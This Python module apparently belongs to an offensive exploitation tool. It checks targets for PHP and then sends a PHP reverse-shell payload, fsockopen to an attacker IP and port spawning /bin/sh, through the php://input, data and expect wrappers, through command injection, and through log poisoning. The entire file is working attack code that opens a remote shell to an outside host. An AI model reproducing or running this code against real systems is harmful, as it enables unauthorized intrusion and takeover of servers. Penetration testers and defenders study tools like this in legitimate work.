"""PHP"""
from src.httpreqs import request
from src.configs import config
from src.utils.encodings import encode
from src.utils.arguments import init_args
from src.attacks.logPoison import exploit_log_poison
from src.utils.info import printInfo
from src.utils.colors import Colors


def exploit_php(exploit, method, ip, port):
    """Exploit PHP"""
    args  = init_args()
    url = exploit["GETVAL"]
    post = exploit["POSTVAL"]

    phpTest = "which%20php"
    phpPayload = f'php+-r+\'$sock%3dfsockopen("{ip}",{port})%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b\''

    print(
        Colors().purple("[?]") + " Checking if php is available on the target system...", flush = True
    )

    if method == "INPUT":
        u = url.replace(config.tempArg, encode(phpTest))
        res, _ = request.REQUEST(
            u, args['httpheaders'], exploit["POSTVAL"], config.proxies, "", ""
        )
        if "/bin" in res.text and "/php" in res.text:
            printInfo(ip, port, "PHP", "input wrapper")
            request.REQUEST(
                url.replace(config.tempArg, encode(phpPayload)),
                args['httpheaders'],
                exploit["POSTVAL"],
                config.proxies,
                "",
                "",
            )

    if method == "DATA":
        if args['mode'] == "post":
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(phpTest)),
                args['httpheaders'],
                post,
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(phpTest)),
                args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )
        if "/bin" in res.text and "/php" in res.text:
            printInfo(ip, port, "PHP", "data wrapper")
            if args['mode'] == "post":
                request.REQUEST(
                    url.replace(config.tempArg, encode(phpPayload)),
                    args['httpheaders'],
                    post,
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(phpPayload)),
                    args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                )

    if method == "EXPECT":
        if args['mode'] == "post":
            res, _ = request.REQUEST(
                url,
                args['httpheaders'],
                post.replace(config.tempArg, encode(phpTest)),
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(phpTest)),
                args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )
        if "/bin" in res.text and "/php" in res.text:
            printInfo(ip, port, "PHP", "expect wrapper")
            if args['mode'] == "post":
                request.REQUEST(
                    url,
                    args['httpheaders'],
                    post.replace(config.tempArg, encode(phpPayload)),
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(phpPayload)),
                    args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                )

    if method == "TRUNC":
        exploit_log_poison(
            ip, port, url, phpPayload, "", encode(phpTest), "/php", exploit["POSTVAL"]
        )

    if method == "CMD":
        if args['mode'] == "post":
            res, _ = request.REQUEST(
                url,
                args['httpheaders'],
                post.replace(config.tempArg, encode(phpTest)),
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(phpTest)),
                args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )
        if "/bin" in res.text and "/php" in res.text:
            printInfo(ip, port, "php", "command injection")
            if args['mode'] == "post":
                request.REQUEST(
                    url,
                    args['httpheaders'],
                    post.replace(config.tempArg, encode(phpPayload)),
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(phpPayload)),
                    args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                )
